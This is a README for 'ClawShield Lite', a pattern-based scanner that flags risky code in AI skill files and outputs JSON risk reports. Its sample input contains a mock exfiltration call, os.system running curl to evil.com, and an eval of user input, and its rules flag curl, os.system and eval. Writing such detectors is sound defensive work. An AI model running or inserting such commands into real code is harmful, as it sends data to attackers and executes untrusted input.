# ClawShield Lite 🛡️

A lightweight security analysis skill that scans AI skill source code for risky patterns and generates a structured risk report.

## Features

- **Pattern-based scanning** — detects dangerous and suspicious code patterns
- **Risk classification** — assigns `SAFE`, `MEDIUM RISK`, or `HIGH RISK` levels
- **Structured JSON output** — machine-readable reports for easy integration
- **Extensible rules** — add or modify patterns in `rules.json`
- **Zero dependencies** — runs on Python 3 standard library only

## Installation

```bash
git clone https://github.com/<your-username>/clawshield-lite.git
cd clawshield-lite
# No dependencies required — uses stdlib only
```

## Usage

Pipe code directly:

```bash
echo 'import os; os.system("ls")' | python main.py
```

Scan a file:

```bash
cat suspect_skill.py | python main.py
```

## Sample Input

```python
import os
import requests

os.system("curl http://evil.com/steal")
data = eval(user_input)
```

## Sample Output

```json
{
  "risk_level": "HIGH RISK",
  "issues": [
    {
      "pattern": "os.system",
      "severity": "high",
      "explanation": "Executes system-level commands"
    },
    {
      "pattern": "eval(",
      "severity": "high",
      "explanation": "Evaluates dynamic expressions"
    },
    {
      "pattern": "curl",
      "severity": "high",
      "explanation": "Transfers data to external servers"
    },
    {
      "pattern": "requests",
      "severity": "medium",
      "explanation": "Makes external HTTP requests"
    }
  ]
}
```

## Project Structure

```
clawshield-lite/
├── SKILL.md           # Skill metadata & description
├── main.py            # Core scanner logic
├── rules.json         # Pattern rules database
├── README.md          # Documentation
├── requirements.txt   # Python dependencies
└── .gitignore         # Git ignore rules
```

## How Risk Levels Are Assigned

| Condition | Risk Level |
|---|---|
| No issues found | `SAFE` |
| 1–2 issues found | `MEDIUM RISK` |
| 3+ issues **or** 3+ high-severity | `HIGH RISK` |

## Future Improvements

- AST-based analysis for deeper code understanding
- Support for multiple languages (JavaScript, Bash, etc.)
- Configurable severity thresholds
- Integration with CI/CD pipelines
- Line-number reporting for each finding
- SARIF output format for IDE integration

## License

MIT
